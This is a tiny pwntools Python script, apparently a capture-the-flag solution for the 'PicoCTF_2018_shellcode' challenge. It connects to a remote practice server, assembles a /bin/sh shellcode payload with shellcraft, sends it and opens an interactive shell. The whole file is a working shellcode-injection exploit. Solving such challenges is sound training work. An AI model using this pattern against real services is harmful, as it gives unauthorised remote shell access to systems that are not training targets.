from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_shellcode')
io = remote('node4.buuoj.cn', 28341)
elf = ELF('PicoCTF_2018_shellcode')

payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
